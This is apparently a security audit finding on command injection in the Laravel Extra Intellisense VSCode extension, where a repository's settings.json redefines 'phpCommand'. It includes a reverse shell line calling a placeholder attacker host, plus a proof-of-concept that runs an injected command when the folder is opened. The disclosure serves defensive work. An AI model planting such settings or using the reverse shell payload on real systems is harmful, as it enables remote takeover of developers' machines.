## Vulnerabilities

### Vulnerability 1: Command Injection via `phpCommand` Configuration

- Description:
    1. A threat actor creates a malicious repository.
    2. Inside this repository, the threat actor creates a `.vscode` directory and a `settings.json` file within it.
    3. In the `settings.json` file, the threat actor sets the `LaravelExtraIntellisense.phpCommand` configuration to a malicious command that injects arbitrary shell commands. For example:
       ```json
       {
           "LaravelExtraIntellisense.phpCommand": "bash -c 'malicious_command; {code}'"
       }
       ```
       or to execute a reverse shell:
       ```json
       {
           "LaravelExtraIntellisense.phpCommand": "bash -c 'bash -i >& /dev/tcp/attacker.ip.address/9001 0>&1; {code}'"
       }
    4. The victim opens this malicious repository in VSCode with the "Laravel Extra Intellisense" extension installed and activated.
    5. When the extension attempts to gather data for autocompletion (e.g., loading configurations, routes, views, etc.), it executes a PHP command using the user-defined `phpCommand`.
    6. Due to the malicious configuration, the injected commands are executed on the victim's system before and/or after the intended PHP code.

- Impact:
    Remote Code Execution (RCE). A threat actor can execute arbitrary commands on the victim's machine with the privileges of the VSCode process. This can lead to full system compromise, data theft, malware installation, and other malicious activities.

- Vulnerability rank: critical

- Currently implemented mitigations:
    None. The extension directly uses the `phpCommand` setting from the user configuration without any sanitization or validation.

- Missing mitigations:
    - The extension should not allow users to arbitrarily configure the base command for PHP execution.
    - Instead of allowing full command replacement, the extension should internally define a secure way to execute PHP (e.g., always using `php -r`) and offer limited, safe configuration options if needed (e.g., for specifying the PHP executable path, but not the entire command structure).
    - Input validation and sanitization of the `phpCommand` setting, although complex and potentially bypassable, could be considered as a secondary mitigation.
    - A warning in the extension's settings description about the security implications of modifying `phpCommand` might raise user awareness, but is not a sufficient mitigation.

- Preconditions:
    1. The victim has the "Laravel Extra Intellisense" extension installed and activated in VSCode.
    2. The victim opens a malicious repository in VSCode.
    3. The malicious repository is crafted to include a `.vscode/settings.json` file that sets a malicious `LaravelExtraIntellisense.phpCommand`.
    4. The extension attempts to run a PHP command, which happens automatically during startup and periodically.

- Source code analysis:
    1. File: `src\helpers.ts`
    2. Function: `Helpers.runPhp(code: string, description: string|null = null)`
    3. Line: `let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";`
       - This line retrieves the `phpCommand` setting from the VSCode configuration. If no setting is provided, it defaults to `"php -r \"{code}\""`.
    4. Line: `let command = commandTemplate.replace("{code}", code);`
       - This line constructs the final command by replacing the `{code}` placeholder in the `commandTemplate` with the provided `$code` (PHP code to be executed).
    5. Line: `cp.exec(command, ...)`
       - This line executes the constructed `command` using `child_process.exec`.
       - **Vulnerability:** The `commandTemplate` is directly taken from user configuration, allowing for arbitrary command injection if a malicious `commandTemplate` is provided. The escaping applied to the `{code}` part is insufficient to prevent injection when the base command itself is user-configurable and can introduce shell execution contexts (like `bash -c`).

- Security test case:
    1. **Setup:**
        - Ensure you have VSCode installed with the "Laravel Extra Intellisense" extension activated.
        - Create a new empty directory named `malicious-repo`.
        - Navigate into `malicious-repo` in your terminal.
        - Create a `.vscode` directory: `mkdir .vscode`
        - Create a `settings.json` file inside `.vscode`: `touch .vscode/settings.json`
        - Open `.vscode/settings.json` and add the following malicious configuration:
          ```json
          {
              "LaravelExtraIntellisense.phpCommand": "bash -c 'touch /tmp/pwned_by_vscode_extension; {code}'"
          }
          ```
    2. **Execution:**
        - Open the `malicious-repo` directory in VSCode.
        - Wait for approximately 1 minute to allow the "Laravel Extra Intellisense" extension to initialize and run its background tasks.
    3. **Verification:**
        - In your terminal, check if the file `/tmp/pwned_by_vscode_extension` exists: `ls /tmp/pwned_by_vscode_extension`
        - If the file exists, it confirms that the injected command `touch /tmp/pwned_by_vscode_extension` was executed, demonstrating command injection vulnerability via the `phpCommand` configuration.

This test case demonstrates that by simply opening a malicious repository with a crafted `settings.json`, an attacker can execute arbitrary commands on the victim's system when the "Laravel Extra Intellisense" extension is active.
